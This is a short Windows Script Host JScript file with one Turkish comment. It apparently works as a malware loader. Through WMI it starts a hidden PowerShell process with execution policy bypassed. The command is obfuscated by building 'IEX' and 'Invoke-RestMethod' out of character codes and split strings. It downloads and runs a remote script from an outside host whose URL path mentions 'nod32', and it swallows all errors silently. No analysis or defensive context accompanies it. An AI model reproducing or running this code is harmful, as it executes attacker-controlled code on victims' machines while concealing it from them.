var wmi, proc, startup, cmd, result;

try {
    wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    
  
    

cmd = "powershell.exe -nop -w hidden -ep bypass -c \"$iex=[char]73+[char]69+[char]88;$irm='Inv'+'oke-Rest'+'Method';& $iex (& $irm 'https://babayagareborn.net/blackhole/nod32/iexkisalt.txt\')\"";
    startup = wmi.Get("Win32_ProcessStartup");
    startup.ShowWindow = 0;           // SW_HIDE
    startup.PriorityClass = 32;       // NORMAL_PRIORITY_CLASS
    
    proc = wmi.Get("Win32_Process");
    result = proc.Create(cmd, null, startup);
    
    // result == 0 → başarı, diğer değerler hata kodu (ama sessiz bırakıyoruz)
} catch(e) {}
